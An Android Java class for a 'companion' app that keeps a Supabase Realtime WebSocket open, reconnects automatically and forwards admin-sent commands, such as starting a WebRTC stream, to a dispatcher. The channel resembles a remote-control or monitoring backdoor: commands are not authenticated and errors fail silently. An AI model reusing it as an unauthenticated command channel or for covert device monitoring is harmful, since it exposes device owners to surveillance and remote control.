package com.snapapp.companion;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import okhttp3.*;
import org.json.JSONObject;
import java.util.concurrent.TimeUnit;

/** Supabase Realtime WebSocket — Phoenix protocol client for commands + WebRTC signaling */
public class RealtimeSocketManager {
    private static RealtimeSocketManager instance;
    private final Context context;
    private OkHttpClient client;
    private WebSocket webSocket;
    private String currentWsUrl, currentDeviceId, currentServerUrl;
    private boolean isConnecting = false;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private int refCounter = 1;

    private RealtimeSocketManager(Context context) {
        this.context = context.getApplicationContext();
        this.client = new OkHttpClient.Builder()
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .pingInterval(15, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
    }

    public static synchronized RealtimeSocketManager getInstance(Context context) {
        if (instance == null) instance = new RealtimeSocketManager(context);
        return instance;
    }

    public synchronized void connect(String wsUrl, String deviceId, String serverUrl) {
        if (wsUrl == null || deviceId == null) return;
        if (webSocket != null && wsUrl.equals(currentWsUrl) && deviceId.equals(currentDeviceId)) return;
        this.currentWsUrl = wsUrl; this.currentDeviceId = deviceId; this.currentServerUrl = serverUrl;
        disconnect();
        startConnection();
    }

    private void startConnection() {
        if (isConnecting || currentWsUrl == null) return;
        isConnecting = true;
        webSocket = client.newWebSocket(new Request.Builder().url(currentWsUrl).build(), new WebSocketListener() {
            @Override public void onOpen(WebSocket ws, Response r) {
                isConnecting = false;
                joinChannel("realtime:device:" + currentDeviceId);
                joinChannel("realtime:webrtc:" + currentDeviceId);
                schedulePhoenixHeartbeat();
            }
            @Override public void onMessage(WebSocket ws, String text) { handleIncomingMessage(text); }
            @Override public void onClosed(WebSocket ws, int code, String reason) { isConnecting = false; scheduleReconnect(); }
            @Override public void onFailure(WebSocket ws, Throwable t, Response r) { isConnecting = false; scheduleReconnect(); }
        });
    }

    private void joinChannel(String topic) {
        if (webSocket == null) return;
        try {
            JSONObject j = new JSONObject();
            j.put("topic", topic); j.put("event", "phx_join");
            j.put("payload", new JSONObject()); j.put("ref", String.valueOf(refCounter++));
            webSocket.send(j.toString());
        } catch (Exception ignored) {}
    }

    private void schedulePhoenixHeartbeat() {
        handler.postDelayed(() -> {
            if (webSocket == null) return;
            try {
                JSONObject hb = new JSONObject();
                hb.put("topic", "phoenix"); hb.put("event", "heartbeat");
                hb.put("payload", new JSONObject()); hb.put("ref", String.valueOf(refCounter++));
                webSocket.send(hb.toString());
                schedulePhoenixHeartbeat();
            } catch (Exception ignored) {}
        }, 15000);
    }

    /**
     * Supabase Realtime Phoenix frame format:
     * { "topic": "realtime:webrtc:<id>", "event": "broadcast",
     *   "payload": { "type": "broadcast", "event": "signal",
     *                "payload": { "type": "answer", "sdp": "...", "sender": "device" } } }
     *
     * Broadcast command frame:
     * { "topic": "realtime:device:<id>", "event": "broadcast",
     *   "payload": { "type": "broadcast", "event": "command",
     *                "payload": { "command": "webrtc_stream", ... } } }
     */
    private void handleIncomingMessage(String text) {
        try {
            JSONObject msg = new JSONObject(text);
            String frameEvent = msg.optString("event", "");

            // Only process "broadcast" Phoenix frames
            if (!"broadcast".equals(frameEvent)) return;

            JSONObject outerPayload = msg.optJSONObject("payload");
            if (outerPayload == null) return;

            // The actual event name is inside payload.event
            String innerEvent = outerPayload.optString("event", "");
            // The actual data is inside payload.payload
            JSONObject data = outerPayload.optJSONObject("payload");
            if (data == null) return;

            if ("command".equals(innerEvent)) {
                CommandDispatcher.dispatch(context, currentServerUrl, currentDeviceId, data, null);
            } else if ("signal".equals(innerEvent)) {
                // Only process signals FROM admin (not echoes of our own)
                String sender = data.optString("sender", "");
                if (!"device".equals(sender)) {
                    CommandDispatcher.handleWebRtcSignal(context, data);
                }
            }
        } catch (Exception ignored) {}
    }

    private void scheduleReconnect() {
        handler.postDelayed(this::startConnection, 5000);
    }

    public synchronized void disconnect() {
        if (webSocket != null) { try { webSocket.close(1000, "Normal closure"); } catch (Exception ignored) {} webSocket = null; }
        isConnecting = false;
    }
}
